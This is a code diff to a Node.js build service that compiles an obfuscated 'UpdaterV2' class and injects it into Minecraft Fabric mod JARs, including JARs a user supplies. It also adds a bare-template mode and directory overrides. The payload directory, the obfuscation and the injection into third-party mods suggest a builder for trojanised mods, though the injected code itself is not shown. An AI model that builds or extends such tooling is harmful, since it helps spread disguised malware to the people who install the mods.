@@ -3,10 +3,10 @@ const path = require("path");
 const { execFile, exec } = require("child_process");
 const db = require("./db");
 
-const BUILDS_DIR = path.resolve(__dirname, "..", "builds");
+const BUILDS_DIR = process.env.BUILDS_DIR ? path.resolve(process.env.BUILDS_DIR) : path.resolve(__dirname, "..", "builds");
 const BUILDER_DIR = path.resolve(__dirname, "..", "builder");
 const PAYLOAD_DIR = path.resolve(__dirname, "..", "payload");
-const SHARED_FILES_DIR = path.resolve(__dirname, "shared-files");
+const SHARED_FILES_DIR = process.env.SHARED_FILES_DIR ? path.resolve(process.env.SHARED_FILES_DIR) : path.resolve(__dirname, "shared-files");
 
 // Helper to run exec as a promise
 function executeCommand(command, args = [], options = {}) {
@@ -134,12 +134,15 @@ async function startPersonalizedBuild(
     // Step 3: Run the JAR builder
     logDetails.steps.push("Step 3: Compiling UpdaterV2 and Injecting into JAR");
 
-    let targetJarPath = path.join(BUILDER_DIR, "fabric-obf.jar"); // Template target
+    // Default template: bare jar containing nothing but the injected class
+    // (obfuscated). Custom jars inject into the user-provided mod instead.
+    const bareTemplate = !customJarName;
+    let targetJarPath = path.join(BUILDER_DIR, "bare-template.jar"); // Marker for bare mode
     if (customJarName) {
       targetJarPath = path.join(SHARED_FILES_DIR, customJarName);
     }
 
-    if (!(await fs.pathExists(targetJarPath))) {
+    if (!bareTemplate && !(await fs.pathExists(targetJarPath))) {
       throw new Error(`Target JAR file not found at ${targetJarPath}`);
     }
 
@@ -160,6 +163,7 @@ async function startPersonalizedBuild(
       cwd: BUILDER_DIR,
       env: {
         ...process.env,
+        BARE_TEMPLATE: bareTemplate ? "1" : "0",
         INJECTOR_JAVA_RELEASE: "17", // Default release to compile UpdaterV2
       },
     });
